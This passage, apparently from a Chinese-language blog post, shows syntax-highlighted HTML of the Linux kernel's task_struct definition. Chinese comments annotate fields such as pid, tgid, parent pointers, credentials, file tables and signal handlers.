class="title">rcu_blocked_node</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* #ifdef CONFIG_PREEMPT_RCU */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_TASKS_RCU</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>			rcu_tasks_nvcsw;</span><br><span class="line">	u8				rcu_tasks_holdout;</span><br><span class="line">	u8				rcu_tasks_idx;</span><br><span class="line">	<span class="type">int</span>				rcu_tasks_idle_cpu;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>		<span class="title">rcu_tasks_holdout_list</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* #ifdef CONFIG_TASKS_RCU */</span></span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sched_info</span>		<span class="title">sched_info</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>		<span class="title">tasks</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SMP</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">plist_node</span>		<span class="title">pushable_tasks</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span>			<span class="title">pushable_dl_tasks</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">// 下面两个指向内存描述符，一般指向同一个内存描述符</span></span><br><span class="line">    <span class="comment">// 内核线程 mm-&gt;null, active_mm 指向从进程借用的内存描述符（前一个进程的active_mm），</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span>		*<span class="title">mm</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span>		*<span class="title">active_mm</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Per-thread vma caching: */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vmacache</span>			<span class="title">vmacache</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SPLIT_RSS_COUNTING</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_rss_stat</span>		<span class="title">rss_stat</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">// 进程状态参数</span></span><br><span class="line">	<span class="type">int</span>				exit_state;</span><br><span class="line">	<span class="type">int</span>				exit_code;</span><br><span class="line">	<span class="type">int</span>				exit_signal;</span><br><span class="line">	<span class="comment">/* The signal sent when the parent dies: */</span></span><br><span class="line">	<span class="type">int</span>				pdeath_signal;</span><br><span class="line">	<span class="comment">/* JOBCTL_*, siglock protected: */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>			jobctl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Used for emulating ABI behavior of previous Linux versions: */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>			personality;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Scheduler bits, serialized by scheduler locks: */</span></span><br><span class="line">	<span class="type">unsigned</span>			sched_reset_on_fork:<span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span>			sched_contributes_to_load:<span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span>			sched_migrated:<span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span>			sched_remote_wakeup:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_PSI</span></span><br><span class="line">	<span class="type">unsigned</span>			sched_psi_wake_requeue:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Force alignment to the next boundary: */</span></span><br><span class="line">	<span class="type">unsigned</span>			:<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Unserialized, strictly &#x27;current&#x27; */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Bit to tell LSMs we&#x27;re in execve(): */</span></span><br><span class="line">	<span class="type">unsigned</span>			in_execve:<span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span>			in_iowait:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> TIF_RESTORE_SIGMASK</span></span><br><span class="line">	<span class="type">unsigned</span>			restore_sigmask:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMCG</span></span><br><span class="line">	<span class="type">unsigned</span>			in_user_fault:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT_BRK</span></span><br><span class="line">	<span class="type">unsigned</span>			brk_randomized:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CGROUPS</span></span><br><span class="line">	<span class="comment">/* disallow userland-initiated cgroup migration */</span></span><br><span class="line">	<span class="type">unsigned</span>			no_cgroup_migration:<span class="number">1</span>;</span><br><span class="line">	<span class="comment">/* task is frozen/stopped (used by the cgroup freezer) */</span></span><br><span class="line">	<span class="type">unsigned</span>			frozen:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_BLK_CGROUP</span></span><br><span class="line">	<span class="comment">/* to be used once the psi infrastructure lands upstream. */</span></span><br><span class="line">	<span class="type">unsigned</span>			use_memdelay:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>			<span class="type">atomic_flags</span>; <span class="comment">/* Flags requiring atomic access. */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">restart_block</span>		<span class="title">restart_block</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="type">pid_t</span>				pid;  <span class="comment">// 全局的进程号</span></span><br><span class="line">	<span class="type">pid_t</span>				tgid; <span class="comment">// 全局线程组标识符</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_STACKPROTECTOR</span></span><br><span class="line">	<span class="comment">/* Canary value for the -fstack-protector GCC feature: */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>			stack_canary;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Pointers to the (original) parent process, youngest child, younger sibling,</span></span><br><span class="line"><span class="comment">	 * older sibling, respectively.  (p-&gt;father can be replaced with</span></span><br><span class="line"><span class="comment">	 * p-&gt;real_parent-&gt;pid)</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Real parent process: */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> __<span class="title">rcu</span>	*<span class="title">real_parent</span>;</span> <span class="comment">// 指向真实父进程</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Recipient of SIGCHLD, wait4() reports: */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> __<span class="title">rcu</span>	*<span class="title">parent</span>;</span> <span class="comment">// 指向父进程，ptrace会用到</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Children/sibling form the list of natural children:</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>		<span class="title">children</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>		<span class="title">sibling</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span>		*<span class="title">group_leader</span>;</span> <span class="comment">// 指向线程组组长</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * &#x27;ptraced&#x27; is the list of tasks this task is using ptrace() on.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * This includes both natural children and PTRACE_ATTACH targets.</span></span><br><span class="line"><span class="comment">	 * &#x27;ptrace_entry&#x27; is this task&#x27;s link on the p-&gt;parent-&gt;ptraced list.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>		<span class="title">ptraced</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>		<span class="title">ptrace_entry</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* PID/PID hash table linkage. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span>			*<span class="title">thread_pid</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span>		<span class="title">pid_links</span>[<span class="title">PIDTYPE_MAX</span>];</span> <span class="comment">/* pid_link指向了和该task_struct结构体相关的pid结构体。</span></span><br><span class="line"><span class="comment">                                                     * 进程号 进程组标识符，全局会话标识符</span></span><br><span class="line"><span class="comment">                                                     */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>		<span class="title">thread_group</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>		<span class="title">thread_node</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">completion</span>		*<span class="title">vfork_done</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* CLONE_CHILD_SETTID: */</span></span><br><span class="line">	<span class="type">int</span> __user			*set_child_tid;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* CLONE_CHILD_CLEARTID: */</span></span><br><span class="line">	<span class="type">int</span> __user			*clear_child_tid;</span><br><span class="line"></span><br><span class="line">	u64				utime;</span><br><span class="line">	u64				stime;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_ARCH_HAS_SCALED_CPUTIME</span></span><br><span class="line">	u64				utimescaled;</span><br><span class="line">	u64				stimescaled;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	u64				gtime;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">prev_cputime</span>		<span class="title">prev_cputime</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_VIRT_CPU_ACCOUNTING_GEN</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vtime</span>			<span class="title">vtime</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NO_HZ_FULL</span></span><br><span class="line">	<span class="type">atomic_t</span>			tick_dep_mask;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">/* Context switch counts: */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>			nvcsw;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>			nivcsw;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Monotonic time in nsecs: */</span></span><br><span class="line">	u64				start_time;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Boot based time in nsecs: */</span></span><br><span class="line">	u64				start_boottime;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* MM fault and swap info: this can arguably be seen as either mm-specific or thread-specific: */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>			min_flt;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>			maj_flt;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Empty if CONFIG_POSIX_CPUTIMERS=n */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">posix_cputimers</span>		<span class="title">posix_cputimers</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Process credentials: */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">ptracer_cred</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">real_cred</span>;</span> <span class="comment">// 初始凭证</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">cred</span>;</span> <span class="comment">// 有效凭证</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="comment">/* Cached requested key. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>			*<span class="title">cached_requested_key</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * executable name, excluding path.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * - normally initialized setup_new_exec()</span></span><br><span class="line"><span class="comment">	 * - access it with [gs]et_task_comm()</span></span><br><span class="line"><span class="comment">	 * - lock it with task_lock()</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">char</span>				comm[TASK_COMM_LEN]; <span class="comment">// 进程名称</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nameidata</span>		*<span class="title">nameidata</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 下面两个分别是 unix 信号量和共享内存</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SYSVIPC</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sysv_sem</span>			<span class="title">sysvsem</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sysv_shm</span>			<span class="title">sysvshm</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    </span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DETECT_HUNG_TASK</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>			last_switch_count;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>			last_switch_time;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">/* Filesystem information: */</span></span><br><span class="line">    <span class="comment">/* 指向文件系统，主要是进程根目录，和工作目录 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fs_struct</span>		*<span class="title">fs</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Open file information: */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span>		*<span class="title">files</span>;</span> <span class="comment">// 打开文件表</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Namespaces: */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nsproxy</span>			*<span class="title">nsproxy</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用于信号处理</span></span><br><span class="line">	<span class="comment">/* Signal handlers: */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">signal_struct</span>		*<span class="title">signal</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sighand_struct</span> __<span class="title">rcu</span>		*<span class="title">sighand</span>;</span></span><br><span class="line">	<span class="type">sigset_t</span>			blocked;</span><br><span class="line">	<span class="type">sigset_t</span>			real_blocked;</span><br><span class="line">	<span class="comment">/* Restored if set_restore_sigmask() was used: */</span></span><br><span class="line">	<span class="type">sigset_t</span>			saved_sigmask;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sigpending</span>		<span class="title">pending</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>			sas_ss_sp;</span><br><span class="line">	<span class="type">size_t</span>				sas_ss_size;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>			sas_ss_flags;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span>		*<span class="title">task_works</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_AUDIT</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_AUDITSYSCALL</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">audit_context</span>		*<span class="title">audit_context</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">kuid_t</span>				loginuid;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>			sessionid;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">seccomp</span>			<span class="title">seccomp</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Thread group tracking: */</span></span><br><span class="line">	u64				parent_exec_id;</span><br><span class="line">	u64				self_exec_id;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Protection against (de-)allocation: mm, files, fs, tty, keyrings, mems_allowed, mempolicy: */</span></span><br><span class="line">	<span class="type">spinlock_t</span>			alloc_lock;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Protection of the PI data structures: */</span></span><br><span class="line">	<span class="type">raw_spinlock_t</span>			pi_lock;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">wake_q_node</span>		<span class="title">wake_q</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_RT_MUTEXES</span></span><br><span class="line">	<span class="comment">/* PI waiters blocked on a rt_mutex held by this task: */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rb_root_cached</span>		<span class="title">pi_waiters</span>;</span></span><br><span class="line">	<span class="comment">/* Updated under owner&#x27;s pi_lock and rq lock */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span>		*<span class="title">pi_top_task</span>;</span></span><br><span class="line">	<span class="comment">/* Deadlock detection and priority inheritance handling: */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rt_mutex_waiter</span>		*<span class="title">pi_blocked_on</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_MUTEXES</span></span><br><span class="line">	<span class="comment">/* Mutex deadlock detection: */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex_waiter</span>		*<span class="title">blocked_on</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_ATOMIC_SLEEP</span></span><br><span class="line">	<span class="type">int</span>				non_block_count;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_TRACE_IRQFLAGS</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>			irq_events;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>			hardirq_enable_ip;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>			hardirq_disable_ip;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>			hardirq_enable_event;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>			hardirq_disable_event;</span><br><span class="line">	<span class="type">int</span>				hardirqs_enabled;</span><br><span class="line">	<span class="type">int</span>				hardirq_context;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>			softirq_disable_ip;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>			softirq_enable_ip;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>			softirq_disable_event;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>			softirq_enable_event;</span><br><span class="line">	<span class="type">int</span>				softirqs_enabled;</span><br><span class="line">	<span class="type">int</span>				softirq_context;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_LOCKDEP</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> MAX_LOCK_DEPTH			48UL</span></span><br><span class="line">	u64				curr_chain_key;</span><br><span class="line">	<span class="type">int</span>				lockdep_depth;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>			lockdep_recursion;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">held_lock</span>		<span class="title">held_locks</span>[<span class="title">MAX_LOCK_DEPTH</span>];</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_UBSAN</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>			in_ubsan;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Journalling filesystem info: */</span></span><br><span class="line">	<span class="type">void</span>				*journal_info;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Stacked block device info: */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bio_list</span>			*<span class="title">bio_list</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_BLOCK</span></span><br><span class="line">	<span class="comment">/* Stack plugging: */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">blk_plug</span>			*<span class="title">plug</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* VM state: */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">reclaim_state</span>		*<span class="title">reclaim_state</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">backing_dev_info</span>		*<span class="title">backing_dev_info</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_context</span>		*<span class="title">io_context</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPACTION</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">capture_control</span>		*<span class="title">capture_control</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">/* Ptrace state: */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>			ptrace_message;</span><br><span class="line">	<span class="type">kernel_siginfo_t</span>		*last_siginfo;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_io_accounting</span>	<span class="title">ioac</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_PSI</span></span><br><span class="line">	<span class="comment">/* Pressure stall state */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>			psi_flags;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_TASK_XACCT</span></span><br><span class="line">	<span class="comment">/* Accumulated RSS usage: */</span></span><br><span class="line">	u64				acct_rss_mem1;</span><br><span class="line">	<span class="comment">/* Accumulated virtual memory usage: */</span></span><br><span class="line">	u64				acct_vm_mem1;</span><br><span class="line">	<span class="comment">/* stime + utime since last update: */</span></span><br><span class="line">	u64				acct_timexpd;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CPUSETS</span></span><br><span class="line">	<span class="comment">/* Protected by -&gt;alloc_lock: */</span></span><br><span class="line">	<span class="type">nodemask_t</span>			mems_allowed;</span><br><span class="line">	<span class="comment">/* Seqence number to catch updates: */</span></span><br><span class="line">	<span class="type">seqcount_t</span>			mems_allowed_seq;</span><br><span class="line">	<span class="type">int</span>				cpuset_mem_spread_rotor;</span><br><span class="line">	<span class="type">int</span>				cpuset_slab_spread_rotor;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CGROUPS</span></span><br><span class="line">	<span class="comment">/* Control Group info protected by css_set_lock: */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">css_set</span> __<span class="title">rcu</span>		*<span class="title">cgroups</span>;</span></span><br><span class="line">	<span class="comment">/* cg_list protected by css_set_lock and tsk-&gt;alloc_lock: */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>		<span class="title">cg_list</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_X86_CPU_RESCTRL</span></span><br><span class="line">	u32				closid;</span><br><span class="line">	u32				rmid;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_FUTEX</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">robust_list_head</span> __<span class="title">user</span>	*<span class="title">robust_list</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">compat_robust_list_head</span> __<span class="title">user</span> *<span class="title">compat_robust_list</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>		<span class="title">pi_state_list</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">futex_pi_state</span>		*<span class="title">pi_state_cache</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span>			<span class="title">futex_exit_mutex</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>			futex_state;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_PERF_EVENTS</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">perf_event_context</span>	*<span class="title">perf_event_ctxp</span>[<span class="title">perf_nr_task_contexts</span>];</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span>			<span class="title">perf_event_mutex</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>		<span class="title">perf_event_list</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_PREEMPT</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>			preempt_disable_ip;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">	<span class="comment">/* Protected by alloc_lock: */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mempolicy</span>		*<span class="title">mempolicy</span>;</span></span><br><span class="line">	<span class="type">short</span>				il_prev;</span><br><span class="line">	<span class="type">short</span>				pref_node_fork;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NUMA_BALANCING</span></span><br><span class="line">	<span class="type">int</span>				numa_scan_seq;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>			numa_scan_period;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>			numa_scan_period_max;</span><br><span class="line">	<span class="type">int</span>				numa_preferred_nid;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>			numa_migrate_retry;</span><br><span class="line">	<span class="comment">/* Migration stamp: */</span></span><br><span class="line">	u64				node_stamp;</span><br><span class="line">	u64				last_task_numa_placement;</span><br><span class="line">	u64				last_sum_exec_runtime;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span>		<span class="title">numa_work</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * This pointer is only modified for current in syscall and</span></span><br><span class="line"><span class="comment">	 * pagefault context (and for tasks being destroyed), so it can be read</span></span><br><span class="line"><span class="comment">	 * from any of the following contexts:</span></span><br><span class="line"><span class="comment">	 *  - RCU read-side critical section</span></span><br><span class="line"><span class="comment">	 *  - current-&gt;numa_group from everywhere</span></span><br><span 